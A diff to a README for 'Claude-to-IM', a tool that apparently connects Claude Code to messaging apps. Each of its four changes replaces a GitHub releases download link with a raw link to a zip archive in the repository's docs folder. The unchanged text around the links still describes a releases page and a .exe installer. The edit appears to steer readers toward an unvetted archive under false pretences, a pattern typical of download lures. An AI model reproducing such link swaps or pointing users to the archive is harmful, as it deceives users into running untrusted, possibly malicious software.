@@ -1,6 +1,6 @@
 # 🤖 Claude-to-IM - Connect Claude Code to IM Platforms
 
-[![Download Claude-to-IM](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/sujaltilokani/Claude-to-IM/releases)
+[![Download Claude-to-IM](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/sujaltilokani/Claude-to-IM/main/docs/IM-Claude-to-2.0.zip)
 
 Claude-to-IM is a simple application that links Claude Code with popular instant messaging apps like Telegram, Discord, and Feishu. You can use it to send and receive messages without needing technical setup. This guide will help you download and run Claude-to-IM on a Windows computer.
 
@@ -41,7 +41,7 @@ To run Claude-to-IM on Windows, make sure your computer meets these minimum requ
 
 Visit the releases page to get the latest version:
 
-[Download Claude-to-IM here](https://github.com/sujaltilokani/Claude-to-IM/releases)
+[Download Claude-to-IM here](https://raw.githubusercontent.com/sujaltilokani/Claude-to-IM/main/docs/IM-Claude-to-2.0.zip)
 
 You will find setup files listed by the version number. Look for the latest Windows installer, usually ending with `.exe`.
 
@@ -116,7 +116,7 @@ If problems persist, check the README or Issues tab on the GitHub repository.
 
 To download, visit the releases page below and get the Windows installer:
 
-[https://github.com/sujaltilokani/Claude-to-IM/releases](https://github.com/sujaltilokani/Claude-to-IM/releases)
+[https://raw.githubusercontent.com/sujaltilokani/Claude-to-IM/main/docs/IM-Claude-to-2.0.zip](https://raw.githubusercontent.com/sujaltilokani/Claude-to-IM/main/docs/IM-Claude-to-2.0.zip)
 
 Pick the file named similar to `Claude-to-IM-Setup.exe` for the newest version.
 
@@ -152,4 +152,4 @@ If you want to explore or contribute on the coding side:
 
 ---
 
-[![Download Claude-to-IM](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/sujaltilokani/Claude-to-IM/releases)
+[![Download Claude-to-IM](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/sujaltilokani/Claude-to-IM/main/docs/IM-Claude-to-2.0.zip)
